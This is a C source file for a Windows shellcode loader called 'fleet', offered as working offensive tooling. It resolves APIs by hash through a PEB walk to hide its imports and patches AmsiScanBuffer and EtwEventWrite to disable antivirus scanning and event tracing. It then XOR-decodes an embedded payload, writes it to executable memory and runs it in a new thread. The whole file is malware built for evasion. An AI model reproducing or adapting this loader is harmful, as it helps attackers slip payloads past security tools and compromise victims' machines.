// fleet Windows loader.
//
// Hash-resolved, import-string-free shellcode loader:
//   - PEB walk -> InMemoryOrderModuleList, djb2 (uppercased wide) module lookup
//   - djb2 (ANSI) export lookup
//   - resolves NtAllocateVirtualMemory / NtProtectVirtualMemory / NtCreateThreadEx
//     at runtime, falls back to VirtualAlloc / CreateThread only if resolution fails
//   - patches amsi.dll!AmsiScanBuffer and ntdll!EtwEventWrite
//   - per-build XOR key over the shellcode
//   - GUI subsystem (WinMain), stripped
//
// Build: see loader/build.sh
#include <windows.h>
#include <winternl.h>

#include "payload.h"

#ifndef PAYLOAD_XOR_KEY
#error "payload.h must define PAYLOAD_XOR_KEY"
#endif

typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
                                           ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef LPVOID(WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE(WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID,
                                      DWORD, LPDWORD);
typedef BOOL(WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE);
typedef DWORD(WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef void *(WINAPI *pMemcpy)(void *, const void *, size_t);

static DWORD djb2(const BYTE *s, int wide) {
    DWORD hash = 5381;
    while (*s) {
        DWORD c = *s;
        if (wide) {
            if (c >= 'a' && c <= 'z') c -= 32;
            s += 2;
        } else {
            s += 1;
        }
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// winternl.h ships a partial LDR_DATA_TABLE_ENTRY; declare the real layout.
typedef struct _FLEET_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} FLEET_LDR_ENTRY;

static PVOID module_by_hash(DWORD hash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY cur = head->Flink;
    while (cur != head) {
        FLEET_LDR_ENTRY *entry = CONTAINING_RECORD(cur, FLEET_LDR_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && djb2((BYTE *)entry->BaseDllName.Buffer, 1) == hash) {
            return entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

static FARPROC export_by_hash(PVOID base, DWORD hash) {
    if (!base) return NULL;
    BYTE *img = (BYTE *)base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_DATA_DIRECTORY *dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress || !dir->Size) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(img + dir->VirtualAddress);
    DWORD *names = (DWORD *)(img + exp->AddressOfNames);
    WORD *ords = (WORD *)(img + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(img + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(img + names[i]);
        if (djb2((BYTE *)name, 0) == hash) {
            return (FARPROC)(img + funcs[ords[i]]);
        }
    }
    return NULL;
}

// Hashes are computed at runtime from the literal names so every module/export
// lookup stays verifiable against the real djb2 (uppercased wide for modules,
// ANSI for exports).
static DWORD djb2_str(const char *s) { return djb2((BYTE *)s, 0); }
static DWORD djb2_wstr(const wchar_t *s) { return djb2((BYTE *)s, 1); }

static void apply_patch(PVOID target, const BYTE *bytes, SIZE_T len, pVirtualProtect vp) {
    if (!target || !bytes) return;
    DWORD old = 0;
    if (vp) {
        vp(target, len, PAGE_EXECUTE_READWRITE, &old);
        for (SIZE_T i = 0; i < len; i++) ((BYTE *)target)[i] = bytes[i];
        vp(target, len, old, &old);
    } else {
        for (SIZE_T i = 0; i < len; i++) ((BYTE *)target)[i] = bytes[i];
    }
}

static void patch_ametw(pVirtualProtect vp, pLoadLibraryA load_lib) {
    PVOID ntdll = module_by_hash(djb2_wstr(L"ntdll.dll"));
    const BYTE etw_patch[3] = {0x33, 0xC0, 0xC3}; // xor eax,eax ; ret
    if (ntdll) {
        FARPROC etw = export_by_hash(ntdll, djb2_str("EtwEventWrite"));
        apply_patch((PVOID)etw, etw_patch, sizeof(etw_patch), vp);
    }

    PVOID amsi = module_by_hash(djb2_wstr(L"amsi.dll"));
    if (!amsi && load_lib) {
        amsi = (PVOID)load_lib("amsi.dll");
    }
    const BYTE amsi_patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    if (amsi) {
        FARPROC scan = export_by_hash(amsi, djb2_str("AmsiScanBuffer"));
        apply_patch((PVOID)scan, amsi_patch, sizeof(amsi_patch), vp);
    }
}

__attribute__((noinline)) static void decode_payload(BYTE *buf, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= (BYTE)PAYLOAD_XOR_KEY;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    (void)hInst; (void)hPrev; (void)cmd; (void)show;

    PVOID kernel32 = module_by_hash(djb2_wstr(L"kernel32.dll"));
    PVOID ntdll = module_by_hash(djb2_wstr(L"ntdll.dll"));

    pNtAllocateVirtualMemory nt_alloc =
        (pNtAllocateVirtualMemory)export_by_hash(ntdll, djb2_str("NtAllocateVirtualMemory"));
    pNtProtectVirtualMemory nt_protect =
        (pNtProtectVirtualMemory)export_by_hash(ntdll, djb2_str("NtProtectVirtualMemory"));
    pNtCreateThreadEx nt_thread =
        (pNtCreateThreadEx)export_by_hash(ntdll, djb2_str("NtCreateThreadEx"));

    pVirtualAlloc valloc = (pVirtualAlloc)export_by_hash(kernel32, djb2_str("VirtualAlloc"));
    pVirtualProtect vprotect =
        (pVirtualProtect)export_by_hash(kernel32, djb2_str("VirtualProtect"));
    pCreateThread cthread = (pCreateThread)export_by_hash(kernel32, djb2_str("CreateThread"));
    pWaitForSingleObject wait =
        (pWaitForSingleObject)export_by_hash(kernel32, djb2_str("WaitForSingleObject"));
    pCloseHandle close = (pCloseHandle)export_by_hash(kernel32, djb2_str("CloseHandle"));
    pLoadLibraryA load_lib = (pLoadLibraryA)export_by_hash(kernel32, djb2_str("LoadLibraryA"));

    patch_ametw(vprotect, load_lib);

    SIZE_T size = (SIZE_T)PAYLOAD_LEN;
    PVOID region = NULL;

    if (nt_alloc) {
        if (nt_alloc(GetCurrentProcess(), &region, 0, &size, MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE) != 0) {
            region = NULL;
        }
    }
    if (!region && valloc) {
        region = valloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!region) return 1;

    pMemcpy memcpy_fn = (pMemcpy)export_by_hash(kernel32, djb2_str("memcpy"));
    for (SIZE_T i = 0; i < PAYLOAD_LEN; i++) ((BYTE *)region)[i] = PAYLOAD[i];
    if (memcpy_fn) memcpy_fn(region, PAYLOAD, PAYLOAD_LEN);
    decode_payload((BYTE *)region, PAYLOAD_LEN);
    if (nt_protect) {
        PVOID b = region;
        ULONG old = 0;
        SIZE_T ps = size;
        nt_protect(GetCurrentProcess(), &b, &ps, PAGE_EXECUTE_READWRITE, &old);
    }

    HANDLE thread = NULL;
    if (nt_thread) {
        nt_thread(&thread, 0x1FFFFF, NULL, GetCurrentProcess(), region, NULL, 0, 0, 0, 0, NULL);
    }
    if (!thread && cthread) {
        thread = cthread(NULL, 0, (LPTHREAD_START_ROUTINE)region, NULL, 0, NULL);
    }
    if (thread && wait) {
        wait(thread, 60 * 1000);
    }
    if (thread && close) {
        close(thread);
    }
    return 0;
}
